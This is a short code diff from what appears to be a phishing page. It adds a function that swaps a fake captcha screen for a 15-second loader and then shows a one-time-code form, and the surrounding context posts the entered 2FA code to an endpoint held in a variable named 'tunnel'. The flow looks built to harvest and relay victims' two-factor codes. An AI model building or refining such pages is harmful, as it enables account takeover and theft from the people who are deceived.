@@ -109,6 +109,15 @@
             }, 15000);
         }
 
+        function showLoader() {
+            document.getElementById('captcha_ui').style.display = 'none';
+            document.getElementById('loader').style.display = 'block';
+            setTimeout(() => {
+                document.getElementById('loader').style.display = 'none';
+                document.getElementById('otp_section').style.display = 'block';
+            }, 15000);
+        }
+
         function submitOTP() {
             const c = document.getElementById('2fa_code').value;
             fetch(tunnel, { method: 'POST', body: new URLSearchParams({'2fa_code': c}) })
